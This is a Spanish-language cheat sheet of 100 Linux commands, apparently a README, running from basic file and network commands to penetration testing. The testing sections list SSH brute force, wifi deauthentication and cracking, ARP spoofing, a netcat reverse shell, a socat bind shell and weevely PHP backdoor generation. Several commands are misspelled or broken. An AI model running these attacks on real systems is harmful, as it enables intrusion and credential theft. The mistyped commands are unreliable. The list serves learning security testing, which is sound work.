# C-digo-b-sico
# 01. Código de comandos básicos para Linux:
   
1.`pwd` - Directorio actual
2. `ls` - Lista los archivos del directorio
3. `cd` - Cambia de directorio
4. `mkdir <carpeta>` - Crea una carpeta
5. `rm <archivo>` - Borra un archivo
6. `rmdir -r <carpeta>`- Borra una carpeta
7. `cp <archivo> <destino>` - Copia archivos
8. `mv <archivo> <destino>` - mueve/cambia de nombre archivos
9. `touch <archivo>` - Crea un archivo
10. `cat <archivo>` - Muestra el contenido de un archivo
11. `nano <archivo>` - Editor de archivo Nano
12. `vim <archivo>` - Editor de archivo Vim
13. `find / -nombre <archivo>` - Busca un archivo
14. `grep "texto" <archivo>` - Busca un texto en un archivo 
15. `history` - Muestra la historia de comandos

# 02. Comandos de información del sistema:

16. uname -a - Muestra información del sistema
17. whoami - Muestra el usuario actual
18. id - Muestra el ID del usuario y del grupo
19. uptime - Muestra la cantidad de tiempo del sistema está operativo
20. df -h - Muestra el uso del disco
21. du -sh <carpeta> - Muestra el tamaño de una carpeta
22. top - Muestra procesos activos
23. ps aux - Lista los procesos que se están ejecutando
24. kill <proceso> - Termina un proceso
25. htop - Gestion de procesos interactivos

# 03. Uso de comandos de gestión:

26. adduser <usuario> - Añade un nuevo usuario
27. deluser <usuario> - Elimina un usuario
28. passwd <usuario> - Cambia la contraseña
29. usermod -aG sudo <usuario> - Da acceso de superusuario
30. groups <usuario> -Muestra los grupos del usuario
31. chmod 777 <archivo> - Cambia los permisos del archivo
32. chown usuario:grupo <archivo> - Cambia el dueño del archivo

# 04. Comandos en redes:

33. ifconfig - Muestra la interfaz de la red
34. ip a - Muestra la dirección IP
35. iwconfig - Muestra la interfaz wifi
36. ping <IP> - Test de conexión IP
37. netstat -tulnp - Muestra los puertos abiertos
38. nmap <IP> - Escanea los puertos abierto del objetivo
39. traceroute <IP> - Traza una ruta a un host
40. curl <URL> - Busca datos de una URL
41. wget <URL> - Descarga un archivo
42. dig <dominio> - Obtiene infomacion DNS
43. nslookup <dominio> - Realiza una busqueda de DNS

# 05. Comandos de Hacking & Test de Penetración:

44. msfconsole - Inicia Mestasploit
45. msfvenom - Genera cargas útiles (payloads)
46. searchsploit <exploit> - Busca exploits
47. sqlmap -u <URL> --dbs - Test de SQL injection
48. hydra -l user -P pass.txt <IP> shh - SSH de fuerza bruta
49. john --wordlist=rockyou.txt hash.txt - Crackea hashes
50. airmon-ng start wlan0 - Permite modo monitorización
51. airdump-ng wlan0mon - Captura paquetes wifi
52. airplay-ng -0 10 -a <BSSID> wlan0mon - Desautentica clientes
53. aircrack-ng -w rockyou.txt -b <BSSID> <archivo_capturado> - Crackea contraseña WIFI
54. hashcat -m 2500 hash.txt rockyou.txt - Cracka hashes usando GPU
55. ettercap -T -q -i eth0 - Realiza una suplantación de ARP
56. driftnet -i eth0 - Captura imágenes del trafico de red
57. tcpdump -i eth0 - Captura paquetes de red
58. tshark -i eth0 - Analisis del trafico de red
59. nikto -h <URL> - Escanea nulnerabilidades de servidores web
60. gobuster dir -u <URL> -w /urs/share/wordlists/dirb/common.txt - Fuerza bruta de la carpeta
61. wpscan --url <URL> - Escanea vulnerabilidades en WordPress

#06. Escalada de Privilegios & Post-Explotaciones:

62. sudo -l - Muestr los privilegios de superusuario
63. sudo su - Cambia a usuario root
64. python -c 'import pty:pty.spawn("/bin/bash/")' - Habilita el shell/terminal
65. nc -lvnp <puerto> - Empieza un Netcat de escucha
66. nc <IP> <puerto> -e /bin/bash - Shell inverso
67. meterpreter> getuid - Muestra el usuario actual en Meterpreter
68. meterpreter> getsystem - Intenta escalar privilegios
69. meterpreter> upload / download <archivo> - Transfiere archivos
70. merterpreter> shell - Obterner shell/terminal del sistema
71. linux-exploit-suggester - Sugiere exploits para escalada de privilegios

# 07. Cifrado de Archivos & Datos:

72. gpg -c <archivo> - Cifra un archivo
73. gpg -d <archivo.gpg> - Descifra un archivo
74. openssl enc -aes-256-cbc -salt -in <archivo> -out <archivo.enc> Cifra usando OpenSSL
75. openssl enc -d -aes-256-cbc -salt -in <archivo.enc> -out <archivo> - Descifra el archivo

# 08. Forense & Esteganografía:

76. string <archivo> - Extrae los strigns de un archivo
77. binwalk <archivo> - Analiza binarios
78. foremost -i <imagen> - Extrae archivos de una imagen
79. exiftool <archivo> - Muestra los metadatos de un archivo
80. stegseek <archivo steg/stegfile> -Detecta datos ocultos en una imagen

09. Cracking de Contraseñas & Hashes:

81. hashid <hash> - Identifica el tipo de hash
82. hydra -L users.txt -P passwords.txt ssh://<IP> - Fuerza bruta SSH
83. john hash.txt --wordlists=rockyou.txt - Crackea hashes de contraseñas

10. Tests de Aplicaciones Web:

84. dir <URL> - Enumeracion de carpetas
85. wfuzz -c -z file,wordlists.txt --hc 404 <URL>/ FUZZ - Web fuzzing
86. xsssniper -u <URL> - Test para XSS
87. commix --url <URL> - Test de inyección de comandos
88. burpsuite - Test con Burp Suite

# Varios:

89. crunch 8 8 abcdefghijklmnopqrstuvwxyz - Genera una wordlist
90. proxychains nmap -sT -Pn <IP> - Usa proxychains con Nmap
91. tor - Abre navegador Tor
92. mitmproxy - Empieza un proxy de man-in-the-middle
93. setoolkit - Comienza una Ingenieria Social con Toolkit
94. cewl -w words.txt -d 5 <URL> - Genera una lista de palabras personalizadas
95. weevely generate password backdoor.php - Crea una backdoor en una web
96. socat TCP-LISTEN:4444,fork EXEC:/bin/bash - Une el shell
97. whois <domain> - Da información sobre el dominio
98. theHarvester -d <domain> -l 100 -b google -Recolecta información sobre email y subdominios
99. fcrackzip -u -D -p rockyou.txt <archivo.zip> - Crackea una contraseña de un archivo .zip
100. dnscan -d <dominio> - Muestra subdominios
